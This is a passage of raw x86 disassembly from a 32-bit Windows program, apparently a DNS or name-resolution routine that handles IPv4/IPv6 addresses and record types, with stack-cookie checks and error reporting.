  408a23:	jmp    0x408ad1
  408a28:	lea    eax,[esp+0x8]
  408a2c:	push   eax
  408a2d:	push   esi
  408a2e:	push   esi
  408a2f:	push   DWORD PTR [edi+0x4]
  408a32:	call   DWORD PTR ds:0x41304c
  408a38:	test   eax,eax
  408a3a:	jne    0x408aa8
  408a3c:	mov    eax,DWORD PTR [esp+0x8]
  408a40:	test   eax,eax
  408a42:	je     0x408aa8
  408a44:	mov    edi,esi
  408a46:	test   eax,eax
  408a48:	je     0x408a92
  408a4a:	cmp    DWORD PTR [eax+0x18],esi
  408a4d:	je     0x408a85
  408a4f:	cmp    edi,DWORD PTR ds:0x40e12c
  408a55:	jb     0x408a6f
  408a57:	push   0x40
  408a59:	call   DWORD PTR ds:0x4131a4
  408a5f:	mov    DWORD PTR [edi*4+0x40e130],eax
  408a66:	pop    ecx
  408a67:	test   eax,eax
  408a69:	je     0x40899b
  408a6f:	mov    edx,DWORD PTR [esp+0x8]
  408a73:	sub    esp,0xc
  408a76:	mov    ecx,DWORD PTR [edi*4+0x40e130]
  408a7d:	mov    edx,DWORD PTR [edx+0x18]
  408a80:	call   0x40c3fb
  408a85:	mov    eax,DWORD PTR [esp+0x8]
  408a89:	inc    edi
  408a8a:	mov    eax,DWORD PTR [eax+0x1c]
  408a8d:	cmp    edi,0xa
  408a90:	jb     0x408a46
  408a92:	push   DWORD PTR [esp+0x8]
  408a96:	mov    DWORD PTR ds:0x40e12c,edi
  408a9c:	call   DWORD PTR ds:0x413034
  408aa2:	mov    DWORD PTR [esp+0x8],esi
  408aa6:	jmp    0x408ad1
  408aa8:	push   DWORD PTR [edi+0x4]
  408aab:	push   0x28
  408aad:	push   0x2
  408aaf:	pop    edi
  408ab0:	push   edi
  408ab1:	call   0x40b328
  408ab6:	add    esp,0xc
  408ab9:	push   edi
  408aba:	call   0x40d391
  408abf:	pop    ecx
  408ac0:	push   eax
  408ac1:	push   0xa
  408ac3:	call   DWORD PTR ds:0x413134
  408ac9:	pop    ecx
  408aca:	pop    ecx
  408acb:	mov    DWORD PTR ds:0x40e12c,esi
  408ad1:	mov    eax,ds:0x40e130
  408ad6:	cmp    DWORD PTR ds:0x40e12c,0x0
  408add:	je     0x408b6e
  408ae3:	push   DWORD PTR ds:0x411bf4
  408ae9:	mov    edx,eax
  408aeb:	mov    ds:0x411bf8,eax
  408af0:	mov    ecx,eax
  408af2:	call   0x4070d6
  408af7:	test   eax,eax
  408af9:	je     0x408db3
  408aff:	push   ecx
  408b00:	lea    edx,[esp+0x2c]
  408b04:	mov    DWORD PTR [esp+0x2c],esi
  408b08:	call   0x40bd75
  408b0d:	push   0xc
  408b0f:	call   DWORD PTR ds:0x4131a4
  408b15:	pop    ecx
  408b16:	mov    ecx,DWORD PTR ds:0x411bf4
  408b1c:	mov    DWORD PTR [ecx],eax
  408b1e:	test   eax,eax
  408b20:	je     0x40899b
  408b26:	push   0x4032ec
  408b2b:	push   0xc
  408b2d:	push   eax
  408b2e:	call   DWORD PTR ds:0x413130
  408b34:	add    esp,0xc
  408b37:	xor    ecx,ecx
  408b39:	inc    ecx
  408b3a:	call   0x40c50d
  408b3f:	mov    ecx,DWORD PTR ds:0x411bf4
  408b45:	mov    DWORD PTR [ecx+0x8],eax
  408b48:	test   eax,eax
  408b4a:	je     0x40899b
  408b50:	mov    edx,DWORD PTR ds:0x411bf8
  408b56:	push   ecx
  408b57:	mov    DWORD PTR [eax],0x1
  408b5d:	mov    DWORD PTR [eax+0x4],esi
  408b60:	push   ecx
  408b61:	mov    ecx,DWORD PTR [ecx+0x8]
  408b64:	call   0x40c5e5
  408b69:	jmp    0x408db3
  408b6e:	push   esi
  408b6f:	push   esi
  408b70:	push   0x1030
  408b75:	mov    DWORD PTR [esp+0x34],esi
  408b79:	call   DWORD PTR ds:0x413000
  408b7f:	mov    edx,eax
  408b81:	mov    DWORD PTR [esp+0x10],edx
  408b85:	test   edx,edx
  408b87:	je     0x408d39
  408b8d:	mov    eax,ds:0x40e12c
  408b92:	mov    edi,esi
  408b94:	mov    ecx,esi
  408b96:	mov    DWORD PTR ds:0x40e12c,edi
  408b9c:	cmp    DWORD PTR [edx+0x4],0x0
  408ba0:	push   0x17
  408ba2:	mov    DWORD PTR [esp+0x38],eax
  408ba6:	mov    DWORD PTR [esp+0x1c],esi
  408baa:	mov    DWORD PTR [esp+0x28],ecx
  408bae:	mov    DWORD PTR [esp+0x10],esi
  408bb2:	pop    eax
  408bb3:	jbe    0x408be6
  408bb5:	lea    ecx,[edx+0x28]
  408bb8:	cmp    WORD PTR [ecx-0x8],ax
  408bbc:	jne    0x408bdf
  408bbe:	call   0x40884e
  408bc3:	test   eax,eax
  408bc5:	je     0x408bdf
  408bc7:	mov    eax,DWORD PTR [esp+0xc]
  408bcb:	add    ecx,0x40
  408bce:	inc    eax
  408bcf:	cmp    eax,DWORD PTR [edx+0x4]
  408bd2:	push   0x17
  408bd4:	mov    DWORD PTR [esp+0x10],eax
  408bd8:	pop    eax
  408bd9:	jb     0x408bb8
  408bdb:	mov    ecx,esi
  408bdd:	jmp    0x408be6
  408bdf:	xor    ecx,ecx
  408be1:	inc    ecx
  408be2:	mov    DWORD PTR [esp+0x24],ecx
  408be6:	cmp    DWORD PTR [edx+0x4],0x0
  408bea:	mov    DWORD PTR [esp+0x20],esi
  408bee:	jbe    0x408d26
  408bf4:	lea    eax,[edx+0x20]
  408bf7:	mov    DWORD PTR [esp+0x1c],0x3500
  408bff:	mov    DWORD PTR [esp+0xc],eax
  408c03:	test   ecx,ecx
  408c05:	je     0x408c23
  408c07:	push   0x17
  408c09:	pop    ecx
  408c0a:	cmp    WORD PTR [eax],cx
  408c0d:	jne    0x408c23
  408c0f:	lea    ecx,[eax+0x8]
  408c12:	call   0x40884e
  408c17:	test   eax,eax
  408c19:	mov    eax,DWORD PTR [esp+0xc]
  408c1d:	jne    0x408cf4
  408c23:	cmp    DWORD PTR [esp+0x18],0x0
  408c28:	jne    0x408c6b
  408c2a:	push   DWORD PTR ds:0x411bf4
  408c30:	mov    edx,eax
  408c32:	mov    ds:0x411bf8,eax
  408c37:	mov    ecx,eax
  408c39:	call   0x4070d6
  408c3e:	neg    eax
  408c40:	sbb    eax,eax
  408c42:	add    eax,0x1
  408c45:	mov    DWORD PTR [esp+0x28],eax
  408c49:	jne    0x408c59
  408c4b:	push   ecx
  408c4c:	lea    edx,[esp+0x34]
  408c50:	mov    DWORD PTR [esp+0x34],esi
  408c54:	call   0x40bd75
  408c59:	mov    edi,DWORD PTR ds:0x40e12c
  408c5f:	mov    edx,DWORD PTR [esp+0x10]
  408c63:	mov    DWORD PTR [esp+0x18],0x1
  408c6b:	cmp    edi,0xa
  408c6e:	jae    0x408d26
  408c74:	cmp    edi,DWORD PTR [esp+0x34]
  408c78:	jb     0x408c99
  408c7a:	push   0x40
  408c7c:	call   DWORD PTR ds:0x4131a4
  408c82:	mov    DWORD PTR [edi*4+0x40e130],eax
  408c89:	mov    edi,DWORD PTR ds:0x40e12c
  408c8f:	pop    ecx
  408c90:	cmp    DWORD PTR [edi*4+0x40e130],esi
  408c97:	je     0x408d12
  408c99:	mov    eax,DWORD PTR [esp+0xc]
  408c9d:	mov    esi,eax
  408c9f:	mov    edi,DWORD PTR [edi*4+0x40e130]
  408ca6:	push   0x10
  408ca8:	pop    ecx
  408ca9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cab:	mov    edi,DWORD PTR ds:0x40e12c
  408cb1:	push   0x2
  408cb3:	pop    edx
  408cb4:	mov    ecx,DWORD PTR [edi*4+0x40e130]
  408cbb:	cmp    WORD PTR [ecx],dx
  408cbe:	mov    edx,DWORD PTR [esp+0x1c]
  408cc2:	jne    0x408cce
  408cc4:	mov    WORD PTR [ecx+0x2],dx
  408cc8:	mov    edi,DWORD PTR ds:0x40e12c
  408cce:	mov    ecx,DWORD PTR [edi*4+0x40e130]
  408cd5:	push   0x17
  408cd7:	pop    esi
  408cd8:	cmp    WORD PTR [ecx],si
  408cdb:	jne    0x408ce7
  408cdd:	mov    WORD PTR [ecx+0x2],dx
  408ce1:	mov    edi,DWORD PTR ds:0x40e12c
  408ce7:	mov    edx,DWORD PTR [esp+0x10]
  408ceb:	inc    edi
  408cec:	mov    DWORD PTR ds:0x40e12c,edi
  408cf2:	xor    esi,esi
  408cf4:	mov    ecx,DWORD PTR [esp+0x20]
  408cf8:	add    eax,0x40
  408cfb:	inc    ecx
  408cfc:	mov    DWORD PTR [esp+0xc],eax
  408d00:	mov    DWORD PTR [esp+0x20],ecx
  408d04:	cmp    ecx,DWORD PTR [edx+0x4]
  408d07:	jae    0x408d26
  408d09:	mov    ecx,DWORD PTR [esp+0x24]
  408d0d:	jmp    0x408c03
  408d12:	push   0x1030
  408d17:	push   DWORD PTR [esp+0x14]
  408d1b:	call   DWORD PTR ds:0x413004
  408d21:	jmp    0x40899b
  408d26:	push   0x1030
  408d2b:	push   edx
  408d2c:	call   DWORD PTR ds:0x413004
  408d32:	cmp    DWORD PTR [esp+0x28],0x0
  408d37:	jne    0x408db3
  408d39:	mov    eax,ds:0x40e130
  408d3e:	push   0xc
  408d40:	mov    ds:0x411bf8,eax
  408d45:	call   DWORD PTR ds:0x4131a4
  408d4b:	pop    ecx
  408d4c:	mov    ecx,DWORD PTR ds:0x411bf4
  408d52:	mov    DWORD PTR [ecx],eax
  408d54:	test   eax,eax
  408d56:	je     0x40899b
  408d5c:	push   0x4032ec
  408d61:	push   0xc
  408d63:	push   eax
  408d64:	call   DWORD PTR ds:0x413130
  408d6a:	add    esp,0xc
  408d6d:	xor    ecx,ecx
  408d6f:	inc    ecx
  408d70:	call   0x40c50d
  408d75:	mov    ecx,DWORD PTR ds:0x411bf4
  408d7b:	mov    DWORD PTR [ecx+0x8],eax
  408d7e:	test   eax,eax
  408d80:	je     0x40899b
  408d86:	mov    edx,DWORD PTR ds:0x411bf8
  408d8c:	push   ecx
  408d8d:	mov    DWORD PTR [eax],0x1
  408d93:	mov    DWORD PTR [eax+0x4],esi
  408d96:	push   ecx
  408d97:	mov    ecx,DWORD PTR [ecx+0x8]
  408d9a:	call   0x40c5e5
  408d9f:	cmp    DWORD PTR [esp+0x10],0x0
  408da4:	jne    0x408db3
  408da6:	push   0x2a
  408da8:	push   0x2
  408daa:	pop    eax
  408dab:	push   eax
  408dac:	call   0x40b328
  408db1:	pop    ecx
  408db2:	pop    ecx
  408db3:	mov    eax,ds:0x411bf4
  408db8:	cmp    DWORD PTR [eax],0x0
  408dbb:	je     0x40899b
  408dc1:	push   DWORD PTR [eax]
  408dc3:	push   0x100
  408dc8:	push   0x412020
  408dcd:	call   DWORD PTR ds:0x413130
  408dd3:	mov    eax,DWORD PTR [esp+0x38]
  408dd7:	add    esp,0xc
  408dda:	test   eax,eax
  408ddc:	je     0x408de9
  408dde:	xor    edx,edx
  408de0:	mov    ecx,eax
  408de2:	call   0x4091cb
  408de7:	jmp    0x408e27
  408de9:	push   DWORD PTR ds:0x411bf4
  408def:	push   0x1
  408df1:	call   0x40d391
  408df6:	pop    ecx
  408df7:	push   0x2b
  408df9:	pop    edx
  408dfa:	mov    ecx,eax
  408dfc:	call   0x40b424
  408e01:	mov    edi,0x4032f4
  408e06:	push   edi
  408e07:	call   DWORD PTR ds:0x413198
  408e0d:	pop    ecx
  408e0e:	push   0x1
  408e10:	call   0x40d391
  408e15:	pop    ecx
  408e16:	push   eax
  408e17:	call   DWORD PTR ds:0x413114
  408e1d:	pop    ecx
  408e1e:	call   0x404205
  408e23:	test   eax,eax
  408e25:	jne    0x408e06
  408e27:	mov    edi,DWORD PTR [esp+0x14]
  408e2b:	mov    eax,DWORD PTR [esp+0x8]
  408e2f:	test   eax,eax
  408e31:	je     0x408e3a
  408e33:	push   eax
  408e34:	call   DWORD PTR ds:0x413034
  408e3a:	mov    eax,ds:0x411bf4
  408e3f:	test   eax,eax
  408e41:	je     0x408e4a
  408e43:	mov    ecx,eax
  408e45:	call   0x40722b
  408e4a:	mov    eax,ds:0x40e12c
  408e4f:	test   eax,eax
  408e51:	je     0x408e70
  408e53:	mov    ecx,DWORD PTR [esi*4+0x40e130]
  408e5a:	test   ecx,ecx
  408e5c:	je     0x408e6b
  408e5e:	push   ecx
  408e5f:	call   DWORD PTR ds:0x413100
  408e65:	mov    eax,ds:0x40e12c
  408e6a:	pop    ecx
  408e6b:	inc    esi
  408e6c:	cmp    esi,eax
  408e6e:	jb     0x408e53
  408e70:	push   edi
  408e71:	call   DWORD PTR ds:0x413154
  408e77:	int3   
  408e78:	int3   
  408e79:	int3   
  408e7a:	int3   
  408e7b:	int3   
  408e7c:	int3   
  408e7d:	push   0x2d
  408e7f:	push   0x2
  408e81:	call   0x40b328
  408e86:	pop    ecx
  408e87:	pop    ecx
  408e88:	push   0x1
  408e8a:	call   DWORD PTR ds:0x413154
  408e90:	int3   
  408e91:	int3   
  408e92:	int3   
  408e93:	int3   
  408e94:	int3   
  408e95:	int3   
  408e96:	mov    edi,edi
  408e98:	push   ebp
  408e99:	mov    ebp,esp
  408e9b:	sub    esp,0x14c
  408ea1:	mov    eax,ds:0x40e004
  408ea6:	xor    eax,ebp
  408ea8:	mov    DWORD PTR [ebp-0x4],eax
  408eab:	push   ebx
  408eac:	push   esi
  408ead:	push   edi
  408eae:	mov    edi,ecx
  408eb0:	mov    ebx,edx
  408eb2:	mov    esi,edi
  408eb4:	lea    ecx,[esi+0x1]
  408eb7:	mov    al,BYTE PTR [esi]
  408eb9:	inc    esi
  408eba:	test   al,al
  408ebc:	jne    0x408eb7
  408ebe:	sub    esi,ecx
  408ec0:	mov    eax,0x100
  408ec5:	cmp    esi,eax
  408ec7:	jb     0x408edc
  408ec9:	push   0x2f
  408ecb:	push   0x2
  408ecd:	call   0x40b328
  408ed2:	pop    ecx
  408ed3:	pop    ecx
  408ed4:	push   0xfffffffd
  408ed6:	pop    eax
  408ed7:	jmp    0x409038
  408edc:	push   eax
  408edd:	lea    eax,[ebp-0x108]
  408ee3:	push   eax
  408ee4:	test   ebx,ebx
  408ee6:	je     0x408eef
  408ee8:	push   0x4032f8
  408eed:	jmp    0x408ef4
  408eef:	push   0x403304
  408ef4:	push   edi
  408ef5:	call   DWORD PTR ds:0x4131a8
  408efb:	add    esp,0x10
  408efe:	cmp    eax,0x1
  408f01:	je     0x408f32
  408f03:	push   0x100
  408f08:	lea    eax,[ebp-0x108]
  408f0e:	push   eax
  408f0f:	push   0x40313c
  408f14:	push   edi
  408f15:	call   DWORD PTR ds:0x4131a8
  408f1b:	add    esp,0x10
  408f1e:	cmp    eax,0x1
  408f21:	je     0x408f32
  408f23:	push   edi
  408f24:	push   0x2e
  408f26:	push   0x2
  408f28:	call   0x40b328
  408f2d:	add    esp,0xc
  408f30:	jmp    0x408ed4
  408f32:	push   0x10
  408f34:	xor    ecx,ecx
  408f36:	pop    edx
  408f37:	inc    ecx
  408f38:	call   0x40b3dc
  408f3d:	mov    edi,eax
  408f3f:	test   edi,edi
  408f41:	jne    0x408f47
  408f43:	push   0xe
  408f45:	jmp    0x408ed6
  408f47:	test   ebx,ebx
  408f49:	je     0x408f53
  408f4b:	mov    ebx,DWORD PTR ds:0x411bf8
  408f51:	jmp    0x408f6a
  408f53:	mov    eax,ds:0x411bf4
  408f58:	mov    ebx,DWORD PTR [eax+0x8]
  408f5b:	test   ebx,ebx
  408f5d:	jne    0x408f67
  408f5f:	mov    eax,DWORD PTR [eax+0xc]
  408f62:	mov    eax,DWORD PTR [eax]
  408f64:	mov    ebx,DWORD PTR [eax+0x8]
  408f67:	add    ebx,0x20
  408f6a:	sub    esp,0xc
  408f6d:	lea    edx,[ebp-0x108]
  408f73:	lea    ecx,[ebp-0x148]
  408f79:	call   0x40bf08
  408f7e:	test   eax,eax
  408f80:	je     0x408f9b
  408f82:	push   edi
  408f83:	lea    edx,[ebp-0x148]
  408f89:	mov    ecx,ebx
  408f8b:	call   0x4070d6
  408f90:	mov    esi,eax
  408f92:	test   esi,esi
  408f94:	je     0x408fbf
  408f96:	cmp    esi,0xfffffffc
  408f99:	je     0x408fb6
  408f9b:	push   0x1
  408f9d:	push   edi
  408f9e:	lea    eax,[ebp-0x108]
  408fa4:	xor    edx,edx
  408fa6:	push   eax
  408fa7:	push   0xff03
  408fac:	inc    edx
  408fad:	mov    ecx,ebx
  408faf:	call   0x406c8e
  408fb4:	mov    esi,eax
  408fb6:	test   esi,esi
  408fb8:	je     0x408fbf
  408fba:	cmp    esi,0xfffffffc
  408fbd:	jne    0x409014
  408fbf:	cmp    DWORD PTR [edi+0x8],0x0
  408fc3:	je     0x409014
  408fc5:	mov    ecx,DWORD PTR ds:0x411bf4
  408fcb:	call   0x40722b
  408fd0:	push   DWORD PTR ds:0x411bf4
  408fd6:	call   DWORD PTR ds:0x413100
  408fdc:	pop    ecx
  408fdd:	push   DWORD PTR [edi]
  408fdf:	mov    DWORD PTR ds:0x411bf4,edi
  408fe5:	push   0x100
  408fea:	push   0x412020
  408fef:	call   DWORD PTR ds:0x413130
  408ff5:	add    esp,0xc
  408ff8:	push   DWORD PTR ds:0x411bf4
  408ffe:	push   0x1
  409000:	call   0x40d391
  409005:	pop    ecx
  409006:	push   0x2b
  409008:	pop    edx
  409009:	mov    ecx,eax
  40900b:	call   0x40b424
  409010:	xor    eax,eax
  409012:	jmp    0x409038
  409014:	mov    ecx,esi
  409016:	call   0x40b6bf
  40901b:	push   eax
  40901c:	lea    eax,[ebp-0x108]
  409022:	push   eax
  409023:	push   0x30
  409025:	push   0x2
  409027:	call   0x40b328
  40902c:	push   edi
  40902d:	call   DWORD PTR ds:0x413100
  409033:	add    esp,0x14
  409036:	mov    eax,esi
  409038:	mov    ecx,DWORD PTR [ebp-0x4]
  40903b:	pop    edi
  40903c:	pop    esi
  40903d:	xor    ecx,ebp
  40903f:	pop    ebx
  409040:	call   0x40cd10
  409045:	mov    esp,ebp
  409047:	pop    ebp
  409048:	ret    
  409049:	int3   
  40904a:	int3   
  40904b:	int3   
  40904c:	int3   
  40904d:	int3   
  40904e:	mov    edi,edi
  409050:	push   ebp
  409051:	mov    ebp,esp
  409053:	sub    esp,0x50
  409056:	push   ebx
  409057:	mov    ebx,ecx
  409059:	push   esi
  40905a:	push   edi
  40905b:	cmp    BYTE PTR [ebx],0x5c
  40905e:	jne    0x409061
  409060:	inc    ebx
  409061:	mov    esi,DWORD PTR [edx+0x8]
  409064:	test   esi,esi
  409066:	je     0x40906d
  409068:	add    esi,0x20
  40906b:	jmp    0x40907d
  40906d:	mov    eax,DWORD PTR [edx+0xc]
  409070:	test   eax,eax
  409072:	je     0x40907b
  409074:	mov    eax,DWORD PTR [eax]
  409076:	mov    esi,DWORD PTR [eax+0x8]
  409079:	jmp    0x409068
  40907b:	xor    esi,esi
  40907d:	sub    esp,0xc
  409080:	mov    DWORD PTR [ebp-0x8],esi
  409083:	mov    edx,ebx
  409085:	lea    ecx,[ebp-0x4c]
  409088:	call   0x40bf08
  40908d:	push   0x2
  40908f:	test   eax,eax
  409091:	mov    eax,ds:0x40e11c
  409096:	pop    ecx
  409097:	je     0x4090db
  409099:	cmp    eax,0x1
  40909c:	je     0x409141
  4090a2:	cmp    eax,0x1c
  4090a5:	je     0x409141
  4090ab:	cmp    eax,0xff03
  4090b0:	je     0x409141
  4090b6:	cmp    eax,0xff
  4090bb:	je     0x409141
  4090c1:	cmp    eax,0xc
  4090c4:	jne    0x4090db
  4090c6:	cmp    WORD PTR [ebp-0x4c],cx
  4090ca:	jne    0x409125
  4090cc:	mov    edx,DWORD PTR [ebp-0x48]
  4090cf:	mov    ecx,ebx
  4090d1:	call   0x40bdf3
  4090d6:	mov    eax,ds:0x40e11c
  4090db:	mov    edx,DWORD PTR ds:0x40e118
  4090e1:	mov    edi,0x4122b0
  4090e6:	mov    ecx,DWORD PTR [ebp-0x8]
  4090e9:	push   0x0
  4090eb:	push   edi
  4090ec:	push   ebx
  4090ed:	push   eax
  4090ee:	call   0x406c8e
  4090f3:	xor    ecx,ecx
  4090f5:	mov    esi,eax
  4090f7:	cmp    esi,0xfffffffc
  4090fa:	je     0x40917a
  4090fc:	cmp    esi,0xfffffffe
  4090ff:	je     0x4091a5
  409105:	cmp    esi,0xffffffff
  409108:	je     0x409194
  40910e:	test   esi,esi
  409110:	je     0x409156
  409112:	mov    ecx,esi
  409114:	call   0x40b6bf
  409119:	push   eax
  40911a:	push   ebx
  40911b:	push   DWORD PTR [ebp+0x8]
  40911e:	push   0x34
  409120:	jmp    0x4091ba
  409125:	cmp    WORD PTR [ebp-0x4c],0x17
  40912a:	jne    0x4090db
  40912c:	sub    esp,0x10
  40912f:	lea    esi,[ebp-0x44]
  409132:	mov    edi,esp
  409134:	mov    ecx,ebx
  409136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409138:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40913a:	call   0x40be57
  40913f:	jmp    0x4090d6
  409141:	mov    edi,0x4122b0
  409146:	lea    edx,[ebp-0x4c]
  409149:	push   edi
  40914a:	mov    ecx,esi
  40914c:	call   0x4070d6
  409151:	xor    ecx,ecx
  409153:	inc    ecx
  409154:	jmp    0x4090f5
  409156:	mov    eax,ds:0x40e11c
  40915b:	cmp    eax,0x1
  40915e:	je     0x409170
  409160:	cmp    eax,0x1c
  409163:	je     0x409170
  409165:	cmp    eax,0xff03
  40916a:	je     0x409170
  40916c:	test   ecx,ecx
  40916e:	je     0x409189
  409170:	mov    DWORD PTR ds:0x411bfc,0x1
  40917a:	mov    ecx,DWORD PTR ds:0x4122c0
  409180:	push   edi
  409181:	push   0x31
  409183:	pop    edx
  409184:	call   0x40b424
  409189:	pop    edi
  40918a:	mov    eax,esi
  40918c:	pop    esi
  40918d:	pop    ebx
  40918e:	mov    esp,ebp
  409190:	pop    ebp
  409191:	ret    0x4
  409194:	push   DWORD PTR [ebp+0x8]
  409197:	push   0x33
  409199:	push   0x2
  40919b:	call   0x40b328
  4091a0:	add    esp,0xc
  4091a3:	jmp    0x409189
  4091a5:	mov    ecx,DWORD PTR ds:0x40e11c
  4091ab:	push   ebx
  4091ac:	call   0x40b8af
  4091b1:	push   eax
  4091b2:	call   0x40b84e
  4091b7:	push   eax
  4091b8:	push   0x32
  4091ba:	push   0x2
  4091bc:	call   0x40b328
  4091c1:	add    esp,0x14
  4091c4:	jmp    0x409189
  4091c6:	int3   
  4091c7:	int3   
  4091c8:	int3   
  4091c9:	int3   
  4091ca:	int3   
  4091cb:	mov    edi,edi
  4091cd:	push   ebp
  4091ce:	mov    ebp,esp
  4091d0:	sub    esp,0x20c
  4091d6:	mov    eax,ds:0x40e004
  4091db:	xor    eax,ebp
  4091dd:	mov    DWORD PTR [ebp-0x4],eax
  4091e0:	push   ebx
  4091e1:	push   esi
  4091e2:	push   edi
  4091e3:	mov    ebx,0xff
  4091e8:	mov    BYTE PTR [ebp-0x208],0x0
  4091ef:	push   ebx
  4091f0:	lea    eax,[ebp-0x207]
  4091f6:	mov    edi,edx
  4091f8:	push   0x0
  4091fa:	push   eax
  4091fb:	mov    esi,ecx
  4091fd:	call   0x40d4a8
  409202:	add    esp,0xc
  409205:	mov    BYTE PTR [ebp-0x108],0x0
  40920c:	lea    eax,[ebp-0x107]
  409212:	push   ebx
  409213:	xor    ebx,ebx
  409215:	push   ebx
  409216:	push   eax
  409217:	call   0x40d4a8
  40921c:	mov    ecx,esi
  40921e:	mov    DWORD PTR ds:0x411bfc,ebx
  409224:	add    esp,0xc
  409227:	lea    edx,[ecx+0x1]
  40922a:	mov    al,BYTE PTR [ecx]
  40922c:	inc    ecx
  40922d:	test   al,al
  40922f:	jne    0x40922a
  409231:	sub    ecx,edx
  409233:	mov    eax,0x100
  409238:	cmp    ecx,eax
  40923a:	jb     0x40924f
  40923c:	push   0x2f
  40923e:	push   0x2
  409240:	call   0x40b328
  409245:	pop    ecx
  409246:	pop    ecx
  409247:	push   0xfffffffd
  409249:	pop    eax
  40924a:	jmp    0x409305
  40924f:	push   eax
  409250:	lea    eax,[ebp-0x208]
  409256:	push   eax
  409257:	push   0x40313c
  40925c:	push   esi
  40925d:	call   DWORD PTR ds:0x4131a8
  409263:	add    esp,0x10
  409266:	cmp    eax,0x1
  409269:	je     0x40927a
  40926b:	push   esi
  40926c:	push   0x2e
  40926e:	push   0x2
  409270:	call   0x40b328
  409275:	add    esp,0xc
  409278:	jmp    0x409247
  40927a:	test   edi,edi
  40927c:	jne    0x40928d
  40927e:	push   0x1
  409280:	call   0x40d391
  409285:	pop    ecx
  409286:	mov    ds:0x4122c0,eax
  40928b:	jmp    0x4092c4
  40928d:	push   ecx
  40928e:	lea    edx,[ebp-0x108]
  409294:	mov    ecx,esi
  409296:	call   0x40b646
  40929b:	mov    ds:0x4122c0,eax
  4092a0:	test   eax,eax
  4092a2:	jne    0x4092af
  4092a4:	lea    eax,[ebp-0x108]
  4092aa:	push   eax
  4092ab:	push   0xc
  4092ad:	jmp    0x40926e
  4092af:	push   esi
  4092b0:	push   0x403070
  4092b5:	push   eax
  4092b6:	call   DWORD PTR ds:0x413190
  4092bc:	mov    eax,ds:0x4122c0
  4092c1:	add    esp,0xc
  4092c4:	push   DWORD PTR ds:0x411bf4
  4092ca:	mov    ecx,eax
  4092cc:	push   0x35
  4092ce:	pop    edx
  4092cf:	call   0x40b424
  4092d4:	mov    edx,DWORD PTR ds:0x411bf4
  4092da:	lea    ecx,[ebp-0x208]
  4092e0:	push   0x412020
  4092e5:	call   0x40904e
  4092ea:	mov    esi,eax
  4092ec:	test   edi,edi
  4092ee:	je     0x409303
  4092f0:	push   DWORD PTR ds:0x4122c0
  4092f6:	call   DWORD PTR ds:0x413158
  4092fc:	pop    ecx
  4092fd:	mov    DWORD PTR ds:0x4122c0,ebx
  409303:	mov    eax,esi
  409305:	mov    ecx,DWORD PTR [ebp-0x4]
  409308:	pop    edi
  409309:	pop    esi
  40930a:	xor    ecx,ebp
  40930c:	pop    ebx
  40930d:	call   0x40cd10
  409312:	mov    esp,ebp
  409314:	pop    ebp
  409315:	ret    
  409316:	int3   
  409317:	int3   
  409318:	int3   
  409319:	int3   
  40931a:	int3   
  40931b:	mov    edi,edi
  40931d:	push   ebp
  40931e:	mov    ebp,esp
  409320:	sub    esp,0x30c
  409326:	mov    eax,ds:0x40e004
  40932b:	xor    eax,ebp
  40932d:	mov    DWORD PTR [ebp-0x4],eax
  409330:	push   ebx
  409331:	push   esi
  409332:	mov    esi,DWORD PTR ds:0x4128fc
  409338:	lea    eax,[ebp-0x207]
  40933e:	push   edi
  40933f:	mov    ebx,0xff
  409344:	mov    BYTE PTR [ebp-0x208],0x0
  40934b:	push   ebx
  40934c:	push   0x0
  40934e:	push   eax
  40934f:	mov    edi,edx
  409351:	call   0x40d4a8
  409356:	add    esp,0xc
  409359:	mov    BYTE PTR [ebp-0x308],0x0
  409360:	lea    eax,[ebp-0x307]
  409366:	push   ebx
  409367:	push   0x0
  409369:	push   eax
  40936a:	call   0x40d4a8
  40936f:	add    esp,0xc
  409372:	mov    BYTE PTR [ebp-0x108],0x0
  409379:	lea    eax,[ebp-0x107]
  40937f:	push   ebx
  409380:	push   0x0
  409382:	push   eax
  409383:	call   0x40d4a8
  409388:	mov    ecx,esi
  40938a:	add    esp,0xc
  40938d:	and    DWORD PTR ds:0x411bfc,0x0
  409394:	lea    edx,[ecx+0x1]
  409397:	mov    al,BYTE PTR [ecx]
  409399:	inc    ecx
  40939a:	test   al,al
  40939c:	jne    0x409397
  40939e:	sub    ecx,edx
  4093a0:	mov    edx,0x100
  4093a5:	cmp    ecx,edx
  4093a7:	jb     0x4093bc
  4093a9:	push   0x2f
  4093ab:	push   0x2
  4093ad:	call   0x40b328
  4093b2:	pop    ecx
  4093b3:	pop    ecx
  4093b4:	push   0xfffffffd
  4093b6:	pop    eax
  4093b7:	jmp    0x4094cd
  4093bc:	push   edx
  4093bd:	lea    eax,[ebp-0x108]
  4093c3:	push   eax
  4093c4:	push   edx
  4093c5:	lea    eax,[ebp-0x308]
  4093cb:	push   eax
  4093cc:	push   0x403310
  4093d1:	push   esi
  4093d2:	call   DWORD PTR ds:0x4131a8
  4093d8:	add    esp,0x18
  4093db:	push   0x2
  4093dd:	pop    ebx
  4093de:	cmp    eax,ebx
  4093e0:	je     0x4093f0
  4093e2:	push   esi
  4093e3:	push   0x2e
  4093e5:	push   ebx
  4093e6:	call   0x40b328
  4093eb:	add    esp,0xc
  4093ee:	jmp    0x4093b4
  4093f0:	test   edi,edi
  4093f2:	jne    0x409403
  4093f4:	push   0x1
  4093f6:	call   0x40d391
  4093fb:	pop    ecx
  4093fc:	mov    ds:0x4122c0,eax
  409401:	jmp    0x409435
  409403:	push   ecx
  409404:	lea    edx,[ebp-0x208]
  40940a:	mov    ecx,esi
  40940c:	call   0x40b646
  409411:	mov    ds:0x4122c0,eax
  409416:	test   eax,eax
  409418:	jne    0x409425
  40941a:	lea    eax,[ebp-0x208]
  409420:	push   eax
  409421:	push   0xc
  409423:	jmp    0x4093e5
  409425:	push   esi
  409426:	push   0x403070
  40942b:	push   eax
  40942c:	call   DWORD PTR ds:0x413190
  409432:	add    esp,0xc
  409435:	mov    eax,ds:0x411bf4
  40943a:	mov    ecx,DWORD PTR [eax+0x8]
  40943d:	test   ecx,ecx
  40943f:	jne    0x409449
  409441:	mov    eax,DWORD PTR [eax+0xc]
  409444:	mov    eax,DWORD PTR [eax]
  409446:	mov    ecx,DWORD PTR [eax+0x8]
  409449:	push   0x1
  40944b:	push   0x411f60
